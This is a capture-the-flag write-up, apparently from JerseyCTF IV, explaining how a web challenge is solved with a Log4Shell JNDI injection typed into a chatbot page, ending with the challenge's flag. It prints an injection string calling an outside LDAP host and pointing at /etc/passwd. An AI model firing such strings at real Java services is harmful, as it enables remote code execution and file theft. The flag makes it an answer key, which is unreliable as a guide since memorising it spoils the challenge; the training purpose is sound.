# logging4joy

## web - medium

### This is the step-by-step method to solving the challenge from the developers Point of View

* This challenge is first met with the following description:
* <img src="https://github.com/JohnZabriskie/JerseyCTFIV-Writeups/assets/98345161/e4fa9880-c580-455d-aedc-66a1cc8fe376" width="50%" height="50%">

* We can see by the description that this is a challenge about the `log4j` or `log4shell` [exploit](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
* Doing some research we can look around and we see that this type of exploit usually requires a user to tap into the LDAP and other JNDI services as they are not protected.
* When we log on the safe environment (seen below) we are just met with a random chatbot that replies with somewhat passive aggressive responses:
* <img src="https://github.com/JohnZabriskie/JerseyCTFIV-Writeups/assets/98345161/5fd39235-8976-4cb9-ada4-ad7d59a6b2c1" width="50%" height="50%">
* We can look at some of the documentation that is provided about the exploit and see that we can try to trigger the exploit with the following command: `{jndi:ldap://sample.com/index/~/etc/passwd}` or something along those lines (the command to trigger this specific exploit is `{jndi:ldap://...}` seen below):
* <img src="https://github.com/JohnZabriskie/JerseyCTFIV-Writeups/assets/98345161/a572e6bf-080f-482d-8c8f-7bdef378814f" width="50%" height="50%">
* When that triggers, we are told to go to the console on the webpage where the actual code *would* be output, but here it is just the flag shown before 
* <img src="https://github.com/JohnZabriskie/JerseyCTFIV-Writeups/assets/98345161/5095f926-ca91-43b6-bc05-f775ae9558fb" width="100%" height="100%">
* To submit the final flag below:
* `jctf{logged_into_the_matrix}`